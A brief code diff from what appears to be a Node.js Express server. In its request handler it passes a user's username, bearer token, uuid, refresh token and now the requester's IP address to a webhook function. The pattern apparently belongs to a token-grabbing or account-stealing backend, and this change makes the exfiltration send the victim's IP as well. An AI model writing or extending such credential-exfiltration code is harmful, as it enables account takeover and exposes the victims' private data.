@@ -33,7 +33,7 @@ app.get('/', async (req, res) => {
             return
         }
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, username, refreshToken)
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
     }
